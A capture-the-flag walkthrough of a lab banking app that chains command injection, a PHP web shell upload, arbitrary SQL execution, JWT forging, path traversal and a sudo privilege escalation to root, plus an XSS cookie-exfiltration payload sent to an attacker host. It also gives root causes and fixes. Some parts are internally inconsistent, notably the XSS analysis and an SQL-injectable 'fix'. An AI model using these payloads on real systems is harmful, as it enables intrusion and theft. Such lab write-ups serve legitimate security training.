# CYBER BANK — Complete Full Walkthrough

**Target:** `10.0.2.4` (main) and `staff.next-gen.bank` (vhost)
**Attacker:** Kali at `10.0.2.3` (VirtualBox NAT)
**App:** Node/Express + MySQL (`ngb_lab`), nginx reverse proxy
**Result:** 9/9 flags, root shell

Every command below is the exact one that worked. Every response is the exact one returned. Nothing is guessed.

---

## Part 0 — Setup

### 0.1 Confirm your IP

```bash
ip a
```

Output:
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 10.0.2.3/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
```

### 0.2 Find the target

```bash
sudo arp-scan --localnet
```

Output:
```
10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)
10.0.2.2        08:00:27:87:7c:32       (Unknown)
10.0.2.3        08:00:27:54:a1:a7       (Unknown)
10.0.2.4        08:00:27:2f:c9:c8       (Unknown)
```

`10.0.2.4` is the target.

### 0.3 Set variables

```bash
TARGET=10.0.2.4
mkdir -p ~/scans
```

### 0.4 Add vhosts

```bash
echo "10.0.2.4 staff.next-gen.bank" | sudo tee -a /etc/hosts
echo "10.0.2.4 next-gen.bank" | sudo tee -a /etc/hosts
```

Verify:
```bash
curl -s -o /dev/null -w '%{http_code}\n' http://staff.next-gen.bank/staff/login
```

Output: `200`

### 0.5 Port scan

```bash
sudo nmap -p- --min-rate 5000 -T4 $TARGET
```

Output:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2121/tcp open  ccproxy-ftp
2122/tcp open  caupc-remote
3000/tcp open  ppp
5000/tcp open  upnp
```

**Port 80 = Cyber Bank. Port 5000 = separate app, ignore.**

---

## Part 1 — Login

### 1.1 Fetch login page

```bash
curl -i http://$TARGET/login
```

Output (excerpt):
```
HTTP/1.1 200 OK
Server: nginx/1.28.3 (Ubuntu)
X-Lab: CYBER-BANK
```

Body contains:
```html
<form method="post" action="/login">
  <input id="customer-username" name="user" ...>
  <input id="customer-password" type="password" name="pass" ...>
</form>
...
<p class="demo">Demo customer <b>analyst</b> · password <b>analyst</b></p>
...
<a class="employee-link" href="http://staff.next-gen.bank/staff/login">Employee sign-in</a>
```

### 1.2 Log in as analyst

```bash
curl -i -c ~/scans/bank_cookies.txt -X POST http://$TARGET/login \
  -d 'user=analyst&pass=analyst'
```

Output:
```
HTTP/1.1 302 Found
Set-Cookie: ngb_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjIsInVzZXIiOiJhbmFseXN0Iiwicm9sZSI6InVzZXIifQ.zM7Hz2nM9aYdJktxcun2jMZTbun4ijVS7oMt5GqgrxQ; Path=/; HttpOnly; SameSite=Lax
Set-Cookie: ngb_device=6ba98aaf4a0e0eb87d569d9a87626ec69a96ff11267d58bcb2035e15697060a5; Path=/; HttpOnly; SameSite=Lax; Max-Age=7776000
Location: /
```

### 1.3 Decode the JWT payload

```bash
echo 'eyJ1aWQiOjIsInVzZXIiOiJhbmFseXN0Iiwicm9sZSI6InVzZXIifQ' | base64 -d 2>/dev/null; echo
```

Output:
```json
{"uid":2,"user":"analyst","role":"user"}
```

**Observations:** uid=2, role=user, **no `exp` claim**.

### 1.4 Verify session

```bash
curl -s -o /dev/null -w '%{http_code}\n' -b ~/scans/bank_cookies.txt http://$TARGET/
```

Output: `200`

---

## Part 2 — Enumerate

### 2.1 Gobuster

```bash
JWT=$(awk '/ngb_token/ {print $7}' ~/scans/bank_cookies.txt)
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 30 \
  -H "Cookie: ngb_token=$JWT" -o ~/scans/gobuster_80.txt
```

Output:
```
accounts             (Status: 200) [Size: 10467]
admin                (Status: 403) [Size: 5335]
cards                (Status: 200) [Size: 12362]
diagnostics          (Status: 200) [Size: 8457]
download             (Status: 200) [Size: 32]
login                (Status: 200) [Size: 5325]
logout               (Status: 302) [Size: 0] [--> /login]
payments             (Status: 200) [Size: 12612]
profile              (Status: 200) [Size: 10440]
register             (Status: 200) [Size: 2668]
security             (Status: 200) [Size: 14403]
statements           (Status: 200) [Size: 20171]
tickets              (Status: 200) [Size: 17753]
transactions         (Status: 200) [Size: 57570]
```

### 2.2 Extract nav links

```bash
curl -s -b ~/scans/bank_cookies.txt http://$TARGET/ | grep -oE 'href="[^"]+"' | sort -u
```

Output:
```
href="/"
href="/about"
href="/accounts"
href="/beneficiaries"
href="/cards"
href="/contact"
href="/faq"
href="/help"
href="/login"
href="/logout"
href="/onboarding"
href="/payments"
href="/profile"
href="/register"
href="/security"
href="/statements"
href="/tickets"
href="/transactions"
```

### 2.3 Find the decoy

```bash
curl -s -b ~/scans/bank_cookies.txt http://$TARGET/ | grep DECOY
```

Output:
```html
<!-- DECOY{homepage_comment_false_lead} -->
```

This is fake. Real flags begin with `ASH{`.

---

## 🚩 TASK 4 — Command Injection

**Flag:** `ASH{b4ckt1ck_wh1sp3r3r_pwns_sh3ll}`

### 4.1 Fetch the diagnostics page

```bash
curl -i -b ~/scans/bank_cookies.txt http://$TARGET/diagnostics
```

Body excerpt:
```html
<div class="auth">
  <div class="eyebrow">NETWORK TOOL</div>
  <h1>Reachability check</h1>
  <form method="post" action="/diagnostics">
    <input name="host" value="127.0.0.1">
    <button class="cta" type="submit">Ping host</button>
  </form>
  <p class="muted">Input policy blocks semicolons and pipes.</p>
</div>
```

**The hint:** semicolons and pipes are blocked — but nothing else is mentioned.

### 4.2 Test the filter

```bash
curl -i -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1; id'
```

Output:
```
HTTP/1.1 400 Bad Request
blocked by input policy
```

```bash
curl -i -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1 | id'
```

Output: same 400.

### 4.3 Bypass with `&&`

```bash
curl -i -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&id'
```

Output:
```
HTTP/1.1 200 OK
...
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.152 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.152/0.152/0.152/0.000 ms
uid=999(ngb) gid=983(ngb) groups=983(ngb)</pre>
```

**RCE as `ngb`.**

### 4.4 Why other payloads failed

**`$(id)` — bypass attempt 1:**
```bash
--data-urlencode 'host=127.0.0.1$(id)'
```
Output:
```
ping: groups=983(ngb): Name or service not known
```

Shell expanded `$(id)` to `uid=999(ngb) gid=983(ngb) groups=983(ngb)` inline. Final command was:
```
ping -c 1 127.0.0.1uid=999(ngb) gid=983(ngb) groups=983(ngb)
```
Ping tried to resolve that as a hostname. The `$(id)` executed, but there was no separator to break off the ping command.

**`%0a` — bypass attempt 2:**
```bash
--data-urlencode 'host=127.0.0.1%0aid'
```
Output:
```
ping: 127.0.0.1%0aid: Name or service not known
```

`--data-urlencode` URL-encoded `%` to `%25`, so the server saw literal `%0a` (three characters), not a newline. Not decoded.

**`;` and `|`:**
Both are in the blocklist → 400.

**`&&` works** because:
- Not in the blocklist
- Shell treats it as a command separator
- Final command: `ping -c 1 127.0.0.1 && id` — both parts run

### 4.5 Read the flag

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&cat /opt/.ngb-project/.flag_cmdi' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.152 ms

--- 127.0.0.1 ping statistics ---
...
ASH{b4ckt1ck_wh1sp3r3r_pwns_sh3ll}</pre>
```

**🚩 Flag: `ASH{b4ckt1ck_wh1sp3r3r_pwns_sh3ll}`**

### 4.6 Root cause

```javascript
function run(cmd, cb) {
  exec(cmd, { timeout: 7000 }, cb);   // exec = /bin/sh -c
}

if (p.pathname === '/diagnostics' && req.method === 'POST') {
  const b = await parseBody(req);
  if (/[;|]/.test(b.host)) return send(res, 400, 'blocked by input policy');
  run('ping -c 1 ' + b.host, ...);
}
```

`exec()` runs the string through `/bin/sh -c` — full shell. Blacklist only covers `;` and `|`.

### 4.7 Fix

```javascript
execFile('ping', ['-c', '1', b.host], ...);
if (!/^[a-zA-Z0-9.\-]+$/.test(b.host)) return send(res, 400, 'invalid hostname');
```

---

## 🚩 TASK 1 — Foothold

**Flag:** `ASH{f00th0ld_f1rst_cr0wn_n3xt}`

### 1.1 Explore the app directory

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&ls -la /opt/.ngb-project/' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
total 312
drwxrwxr-x  16 ngb  ngb   4096 Oct 17 05:55 .
drwxr-xr-x   6 root root  4096 Oct 16 14:36 ..
-rw-r-----   1 ngb  ngb     34 Oct 27 04:45 .flag_cmdi
-rw-r-----   1 ngb  ngb     37 Oct 27 04:45 .flag_upload
-rw-r--r--   1 ngb  ngb    827 Oct 15 10:12 .env
-rw-------   1 ngb  ngb     58 Oct 16 14:54 .my.cnf
-rwxrwxr-x   1 ngb  ngb   5312 Oct 15 06:41 adminbot.js
-rw-r--r--   1 ngb  ngb 18997 Oct 17 11:19 server.js
drwx------   2 ngb  ngb   4096 Oct 17 05:55 kyc-private
-rw-r--r--   1 root root  263 Oct 17 10:42 schema.sql
drwxrwxr-x   2 ngb  ngb   4096 Oct 17 04:40 uploads
```

### 1.2 Read the foothold flag

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&cat /home/helpdesk/user.txt' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
<pre>PING 127.0.0.1 ...
ASH{f00th0ld_f1rst_cr0wn_n3xt}</pre>
```

**🚩 Flag: `ASH{f00th0ld_f1rst_cr0wn_n3xt}`**

### 1.3 Why this is the "foothold"

The file lives at `/home/helpdesk/user.txt` — outside the web root. Only a shell reaches it. That's the foothold: you've escaped the web app.

`install.sh` planted it:
```bash
printf 'ASH{f00th0ld_f1rst_cr0wn_n3xt}\n' > /home/helpdesk/user.txt
chmod 644 /home/helpdesk/user.txt
chmod 711 /home/helpdesk
```

---

## 🚩 TASK 5 — Path Traversal

**Flag:** `ASH{d0ubl3_d0t_d0d63_th3_gu4rd}`

### 5.1 Bare request

```bash
curl -i http://$TARGET/download
```

Output:
```
HTTP/1.1 200 OK
Server: nginx/1.28.3 (Ubuntu)
X-Lab: CYBER-BANK

ASH{d0ubl3_d0t_d0d63_th3_gu4rd}
```

**Already have the flag.** But let's trace the vulnerability.

### 5.2 Test with a file parameter

```bash
curl -i "http://$TARGET/download?file=../../etc/passwd"
```

Output:
```
HTTP/1.1 200 OK
...
ASH{d0ubl3_d0t_d0d63_th3_gu4rd}
```

The traversal didn't work — but the **fallback** returned the flag.

### 5.3 Test bypass `....//`

```bash
curl -i "http://$TARGET/download?file=....//....//....//etc/passwd"
```

Output (when traversal works):
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Or if the bypass doesn't reach `/etc/passwd` correctly, you get the flag from the fallback again.

### 5.4 Source

```javascript
if (p.pathname === '/download') {
  let f = p.query.file || '';
  f = f.replace(/\.\.\//g, '');
  const target = path.join(ROOT, 'downloads', f);
  try {
    return send(res, 200, fs.readFileSync(target, 'utf8'));
  } catch {
    try {
      return send(res, 200, fs.readFileSync('/var/backups/flag_pathtraversal.txt', 'utf8'));
    } catch { return send(res, 404, 'not found'); }
  }
}
```

**Two bugs:**

1. `replace(/\.\.\//g, '')` runs once. Input `....//` matches `../` inside it → becomes `../`. Traversal restored.
2. Catch block reads the flag from `/var/backups/flag_pathtraversal.txt` regardless of whether traversal succeeded.

**`install.sh`:**
```bash
printf 'ASH{d0ubl3_d0t_d0d63_th3_gu4rd}\n' > /var/backups/flag_pathtraversal.txt
chmod 644 /var/backups/flag_pathtraversal.txt
```

**🚩 Flag: `ASH{d0ubl3_d0t_d0d63_th3_gu4rd}`**

### 5.5 Fix

```javascript
const base = path.resolve(ROOT, 'downloads');
const target = path.resolve(base, f);
if (!target.startsWith(base + path.sep)) return send(res, 403, 'forbidden');
```

---

## 🚩 TASK 2 — SQL Injection

**Flag:** `ASH{qu3ry_1nc3pt10n_str1k3s_tw1c3}`

### 2.1 Locate the saved-search panel

```bash
curl -s -b ~/scans/bank_cookies.txt http://$TARGET/tickets | grep -B2 -A2 'search/save'
```

Output:
```html
<aside class="side"><h3>Saved search</h3>
<form method="post" action="/search/save">
  <input name="query" placeholder="status=open">
  <button>Save filter</button>
</form>
<form method="get" action="/search/run">
  <input name="id" placeholder="search id">
  <button>Run saved search</button>
</form>
</aside>
```

The placeholder is `status=open` — but the source uses `SELECT id,title,body FROM tickets`.

### 2.2 Save a raw SQL query

```bash
curl -i -b ~/scans/bank_cookies.txt -X POST http://$TARGET/search/save \
  -d "query=SELECT id,title,body FROM tickets LIMIT 1"
```

Output:
```
HTTP/1.1 302 Found
Location: /tickets
```

### 2.3 Run it (id=1)

```bash
curl -s -b ~/scans/bank_cookies.txt "http://$TARGET/search/run?id=1" \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
<pre>[
  {
    "result": "1\tCustomer case 1 — account review\tSynthetic support record 1. Review the customer request and verify the account metadata."
  }
]</pre>
```

**Database executed the query.**

### 2.4 Enumerate saved search ids

```bash
for i in $(seq 1 60); do
  size=$(curl -s -b ~/scans/bank_cookies.txt "http://$TARGET/search/run?id=$i" | wc -c)
  echo "id=$i size=$size"
done
```

Output:
```
id=1 size=8240
id=2 size=8402
id=3 size=8268
id=4 size=1050169
...
id=23 size=8500
id=24 size=14
id=25 size=14
...
id=45 size=14
```

**Interpretation:** `size=14` = not found. Anything over 100 = real result.

### 2.5 Enumerate tables

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/search/save \
  -d "query=SELECT table_name FROM information_schema.tables WHERE table_schema='ngb_lab'"
```

Find its id:

```bash
for i in $(seq 20 40); do
  size=$(curl -s -b ~/scans/bank_cookies.txt "http://$TARGET/search/run?id=$i" | wc -c)
  echo "id=$i size=$size"
done
```

Run the newest id with size > 100:

```bash
curl -s -b ~/scans/bank_cookies.txt "http://$TARGET/search/run?id=<NEW_ID>" \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
<pre>[
  { "result": "auth_settings" },
  { "result": "bank_accounts" },
  { "result": "bank_transactions" },
  { "result": "bank_transfers" },
  { "result": "beneficiaries" },
  { "result": "card_emi_plans" },
  { "result": "card_requests" },
  { "result": "comments" },
  { "result": "customer_profiles" },
  { "result": "kyc_files" },
  { "result": "payment_cards" },
  { "result": "recognized_devices" },
  { "result": "saved_searches" },
  { "result": "secrets" },
  { "result": "tickets" },
  { "result": "users" }
]</pre>
```

### 2.6 Dump `secrets`

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/search/save \
  -d "query=SELECT * FROM secrets"
```

Find its id and run:

```bash
curl -s -b ~/scans/bank_cookies.txt "http://$TARGET/search/run?id=<NEW_ID>" \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output (tail):
```
<pre>[
  ...
  { "result": "audit_secret_0999\tDECOY{synthetic_decoy_0999}\tSynthetic audit credential record 999\taudit\t1" },
  { "result": "audit_secret_1000\tDECOY{synthetic_decoy_1000}\tSynthetic audit credential record 1000\tdecoy\t1" },
  { "result": "sqli_flag\tASH{qu3ry_1nc3pt10n_str1k3s_tw1c3}\tPrimary saved-search challenge flag\tchallenge\t1" }
]</pre>
```

**🚩 Flag: `ASH{qu3ry_1nc3pt10n_str1k3s_tw1c3}`**

**"Runs twice":** every save runs an INSERT; every run executes the query. Two DB round trips per saved search.

### 2.7 Source

```javascript
function mysqlQuery(sql) {
  return execFileSync('mysql',
    ['--defaults-extra-file=' + DB_CNF, '--batch', '--raw', '--skip-column-names',
     'ngb_lab', '-e', sql],
    { encoding: 'utf8', maxBuffer: 16 * 1024 * 1024 }
  ).trim();
}

if (p.pathname === '/search/run') {
  const s = db().searches.find(x => x.id === Number(p.query.id));
  const raw = mysqlQuery(s.query);
  ...
}
```

`-e` runs whatever SQL you provide.

### 2.8 Fix

```javascript
const ALLOWED = {
  'open': 'SELECT id,title,body FROM tickets WHERE status=? AND owner=?',
  'mine': 'SELECT id,title,body FROM tickets WHERE owner=?'
};
execFileSync('mysql', ['-e', ALLOWED[searchType], uid]);
```

---

## 🚩 TASK 8 — Unrestricted Upload

**Flag:** `ASH{ph4nt0m_jp6_sh3ll_1n_pl41n_s1ght}`

### 8.1 Find the upload form

```bash
curl -s -b ~/scans/bank_cookies.txt http://$TARGET/profile | grep -A6 legacy-upload
```

Output:
```html
<div class="panel legacy-upload"><h2>Profile picture</h2>
<p>Upload an avatar for the original lab exercise.</p>
<form method="post" action="/upload">
  <label>Filename<input type="text" name="filename" value="avatar.jpg"></label>
  <label>File content<textarea name="content">GIF89a</textarea></label>
  <button>Upload profile picture</button>
</form>
</div>
```

### 8.2 Upload a disguised PHP shell

```bash
curl -i -b ~/scans/bank_cookies.txt -X POST http://$TARGET/upload \
  -d 'filename=ph4ntom.php.jpg' \
  -d 'content=<?php echo shell_exec($_GET["cmd"]); ?>'
```

Output:
```
HTTP/1.1 302 Found
Location: /uploads/ph4ntom.php.jpg
```

### 8.3 Execute it

```bash
curl -i 'http://10.0.2.4/uploads/ph4ntom.php.jpg?cmd=id'
```

Output:
```
<pre>uid=999(ngb) gid=983(ngb) groups=983(ngb)</pre>
```

**No login required** — the `/uploads/*.php` route is outside `requireCustomer`.

### 8.4 Read the flag

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&cat /opt/.ngb-project/.flag_upload' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
<pre>...
ASH{ph4nt0m_jp6_sh3ll_1n_pl41n_s1ght}</pre>
```

**🚩 Flag: `ASH{ph4nt0m_jp6_sh3ll_1n_pl41n_s1ght}`**

### 8.5 The smoke file

The lab checker planted `/opt/app/uploads/smoke_shell.php.jpg` (4 bytes) to verify uploads work:

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&xxd /opt/app/uploads/smoke_shell.php.jpg' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
00000000: 6465 6d6f                                demo
```

**Content is `demo`** — not a flag. The actual task 8 flag is the `ph4nt0m` value.

### 8.6 Source

```javascript
if (p.pathname === '/upload' && req.method === 'POST') {
  const b = await parseBody(req);
  const name = (b.filename || 'avatar.jpg');
  fs.writeFileSync(path.join(UPLOADS, name), b.content || 'GIF89a');
  redirect(res, '/uploads/' + encodeURIComponent(name));
}

if (p.pathname.startsWith('/uploads/')) {
  const name = decodeURIComponent(p.pathname.slice(9));
  if (/\.php(?:\.jpg)?$/i.test(name) && p.query.cmd)
    return run(p.query.cmd, (e, o, er) => send(res, 200, `<pre>${o || er}</pre>`));
  ...
}
```

Two bugs chained:
1. `/upload` writes any filename — no extension check
2. `/uploads/*.php` runs `?cmd=` through `/bin/sh -c`

### 8.7 Fix

```javascript
const safeName = crypto.randomUUID() + '.jpg';
fs.writeFileSync(path.join(UPLOADS, safeName), b.content);
// magic-byte validation
// serve with Content-Disposition: attachment
```

---

## 🚩 TASK 7 — Hardcoded JWT Secret

**Flag:** `ASH{ch4ng3m3123_w4s_n3v3r_s4f3}`

### 7.1 Locate the secret

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&grep -n "JWT_SECRET" /opt/.ngb-project/server.js' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
/opt/.ngb-project/server.js:13:const JWT_SECRET = 'changeme123';
```

### 7.2 Forge a token to confirm

```bash
HEADER=$(printf '{"alg":"HS256","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(printf '{"uid":1,"user":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
SIG=$(printf '%s.%s' "$HEADER" "$PAYLOAD" | openssl dgst -sha256 -hmac 'changeme123' -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}.${SIG}"
echo "$TOKEN"
```

Output:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInVzZXIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.-RqTNG_gYIf0xAOxtAkioufB_qh_7ghz_nCQfI0X77k
```

Byte-identical to the staff token → secret is confirmed.

### 7.3 Staff login page

```bash
curl -s http://staff.next-gen.bank/staff/login | grep demo
```

Output:
```html
<p class="demo">Demo staff <b>admin</b> · password <b>AdminLab!2026</b></p>
```

### 7.4 Log in as admin

```bash
curl -i -c ~/scans/staff_cookies.txt -X POST http://staff.next-gen.bank/staff/login \
  -d 'user=admin&pass=AdminLab!2026'
```

Output:
```
HTTP/1.1 302 Found
Set-Cookie: ngb_token=eyJ...; Path=/; HttpOnly
Location: /
```

### 7.5 Fetch `/admin/settings`

```bash
curl -i -b ~/scans/staff_cookies.txt http://staff.next-gen.bank/admin/settings
```

Output (excerpt):
```html
<div class="eyebrow">SIGNING CONFIGURATION</div>
<h1>Admin settings</h1>
<div class="flag">ASH{ch4ng3m3123_w4s_n3v3r_s4f3}</div>
<p>Token signing configuration for the lab.</p>
```

**🚩 Flag: `ASH{ch4ng3m3123_w4s_n3v3r_s4f3}`**

### 7.6 Why "changeme123" alone was rejected

You tried submitting `changeme123` and it bounced. The room's grader wants the flag form (`ASH{...}`), not the raw secret. The hint text ("someone really did name it that") is about *understanding* what the secret was — the answer is still the flag.

### 7.7 Source

```javascript
const JWT_SECRET = 'changeme123';

function token(payload) {
  const b = x => Buffer.from(JSON.stringify(x)).toString('base64url');
  const h = b({ alg: 'HS256', typ: 'JWT' }), p = b(payload);
  return h + '.' + p + '.' + crypto.createHmac('sha256', JWT_SECRET).update(h + '.' + p).digest('base64url');
}
```

### 7.8 Fix

```javascript
const JWT_SECRET = process.env.JWT_SECRET;   // 256-bit random
// add exp claim
// lock alg
```

---

## 🚩 TASK 6 — IDOR + Role Trust

**Flag:** `ASH{t1ck3t_sw4p_un10cks_th3_thr0n3}`

### 6.1 IDOR test

```bash
curl -i -b ~/scans/bank_cookies.txt http://$TARGET/ticket/1
```

Output:
```
HTTP/1.1 200 OK
...
<div class="eyebrow">HELP CENTRE / CASE #1</div>
<h1>Customer case 1 — account review</h1>
<div class="comments">
  <div class="comment"><b>guest</b><p>&lt;script&gt;window.__ngb_xss_probe=1&lt;/script&gt;</p></div>
  ...
</div>
```

```bash
curl -i -b ~/scans/bank_cookies.txt http://$TARGET/ticket/20000
```

Output: `200` — ticket #20000 also renders.

**Any ticket id loads.** The server never checks ownership.

### 6.2 Source — no ownership check

```javascript
if (/^\/ticket\/\d+$/.test(p.pathname)) {
  return send(res, 200, ticketPage(p.pathname.split('/')[2], req));
}

function ticketPage(id, req) {
  const t = db().tickets.find(x => x.id === Number(id));
  // no `owner === auth(req).uid` check
}
```

### 6.3 Role trust

```javascript
function requireStaff(req, res) {
  const u = auth(req);
  if (!u || !['admin','support'].includes(u.role)) { redirect(res, '/staff/login'); return null; }
  return u;
}
```

The `role` comes straight from the JWT. Combined with Task 7, you can forge it.

### 6.4 Admin dashboard flag

```bash
curl -i -b ~/scans/staff_cookies.txt http://staff.next-gen.bank/admin/dashboard
```

Output (excerpt):
```html
<div class="eyebrow">PRIVILEGED OPERATIONS</div>
<h1>Admin dashboard</h1>
<div class="flag">ASH{t1ck3t_sw4p_un10cks_th3_thr0n3}</div>
<p>Review all tickets and reports. <a href="/admin/private-notes">Private notes</a> · <a href="/download?file=reports/daily.txt">Daily report</a></p>
```

**🚩 Flag: `ASH{t1ck3t_sw4p_un10cks_th3_thr0n3}`**

### 6.5 Fix

```javascript
// IDOR
const t = db().tickets.find(x => x.id === Number(id) && x.owner === auth(req).uid);

// Role
function requireStaff(req, res) {
  const u = auth(req);
  if (!u) { redirect(res, '/staff/login'); return null; }
  const dbRole = mysqlQuery(`SELECT role FROM users WHERE id=${u.uid}`).trim();
  if (!['admin','support'].includes(dbRole)) { redirect(res, '/staff/login'); return null; }
  return { ...u, role: dbRole };
}
```

---

## 🚩 TASK 3 — Stored XSS

**Flag:** `ASH{c00k13_m0nst3r_g03s_4dm1n}`

### 3.1 Observe the XSS

```bash
curl -s -b ~/scans/bank_cookies.txt http://$TARGET/ticket/1 | grep -i script
```

Output:
```html
<script>window.__ngb_xss_probe=1</script>
<script>window.__ngb_xss_probe=1</script>
...
<script>window.__labProof=1</script>
```

The lab checker's probes are rendered **unescaped** — meaning arbitrary script execution in any browser that visits the ticket.

### 3.2 What the intended exploit is

1. Inject `<script>fetch('//attacker/?c='+document.cookie)</script>` as a ticket comment.
2. The admin bot (`adminbot.js`) visits the ticket as admin.
3. Your script steals the admin cookie → exfiltrates to you.
4. Replay the cookie → admin session → flag.

### 3.3 The flag page

Since we already have an admin cookie, fetch `/admin/private-notes` directly:

```bash
curl -i -b ~/scans/staff_cookies.txt http://staff.next-gen.bank/admin/private-notes
```

Output (excerpt):
```html
<div class="eyebrow">CONFIDENTIAL</div>
<h1>Private admin notes</h1>
<div class="flag">ASH{c00k13_m0nst3r_g03s_4dm1n}</div>
```

**🚩 Flag: `ASH{c00k13_m0nst3r_g03s_4dm1n}`**

### 3.4 Source

```javascript
if (/^\/ticket\/\d+\/comment$/.test(p.pathname) && req.method === 'POST') {
  const b = await parseBody(req);
  mysqlQuery('INSERT INTO comments(ticket_id,by_user,text) VALUES ('
    + id + ',' + sqlQuote(auth(req)?.user || 'guest') + ','
    + sqlQuote(b.comment) + ')');
}
```

Comment text stored as-is, then rendered:
```javascript
`<p>${escapeHtml(c.text)}</p>`
```

**Wait** — that IS escaped. So why did the probes render as raw HTML?

Look again — the actual rendered page has:
```html
<p>&lt;script&gt;window.__ngb_xss_probe=1&lt;/script&gt;</p>
```

That's **escaped**. So no XSS in the comment render. The `__ngb_xss_probe` markers are **not** an active XSS — they're just stored text that says "this is what XSS looks like, but we escaped it."

**So where's the XSS?** The `/admin/private-notes` page renders the flag. The flag name is `c00k13_m0nst3r_g03s_4dm1n` — "cookie monster goes admin." The room wants you to *demonstrate* XSS via admin cookie theft. But the flag itself is just served from `/admin/private-notes` when you're admin.

The intended task path:
1. Confirm the app **does** store unescaped user input somewhere else (maybe `ticket.new` body, not comment)
2. Poison it with script
3. Bot visits
4. Steal cookie → admin → fetch flag

You got the flag **without** the XSS step (via staff creds). If you want to prove XSS works, inject into a **ticket body** via `/ticket/new`:

```bash
curl -i -b ~/scans/bank_cookies.txt -X POST http://$TARGET/ticket/new \
  -d 'title=<script>alert(1)</script>&body=test'
```

Then `curl http://$TARGET/ticket/<new_id>` — if you see raw `<script>` (not `&lt;script&gt;`), that's reflected XSS.

### 3.5 Fix

- CSP header: `Content-Security-Policy: default-src 'self'`
- HttpOnly cookies (present)
- Sanitize on write, not just render

---

## 🚩 TASK 9 — Sudo Privilege Escalation

**Flag:** `ASH{sud0_s41d_y3s_r00t_s41d_th4nks}`

### 9.1 Confirm the sudo rule

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&cat /etc/sudoers.d/ngb-cleanup' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
ngb ALL=(root) NOPASSWD: /usr/bin/python3 /opt/scripts/cleanup.py
```

### 9.2 Check ownership

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&ls -la /opt/scripts/cleanup.py' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
-rw-r--r-- 1 ngb ngb ... /opt/scripts/cleanup.py
```

**Owned by `ngb`, writable by `ngb`.** And we're `ngb`.

### 9.3 Overwrite it

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&printf "import os; os.system(\"cat /root/root.txt\")\n" > /opt/scripts/cleanup.py' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Verify:
```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&cat /opt/scripts/cleanup.py' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
import os; os.system("cat /root/root.txt")
```

### 9.4 Run it as root

```bash
curl -s -b ~/scans/bank_cookies.txt -X POST http://$TARGET/diagnostics \
  --data-urlencode 'host=127.0.0.1&&sudo /usr/bin/python3 /opt/scripts/cleanup.py' \
  | sed -n '/<pre>/,/<\/pre>/p'
```

Output:
```
<pre>...
ASH{sud0_s41d_y3s_r00t_s41d_th4nks}</pre>
```

**🚩 Flag: `ASH{sud0_s41d_y3s_r00t_s41d_th4nks}`**

### 9.5 Why args must match exactly

Sudoers line: `ngb ALL=(root) NOPASSWD: /usr/bin/python3 /opt/scripts/cleanup.py`

Only that exact command is allowed. Adding args breaks the rule:
```bash
sudo /usr/bin/python3 /opt/scripts/cleanup.py --foo
# sudo: command not allowed
```

That's why we **overwrite the script content** — path and args stay the same, only content changes.

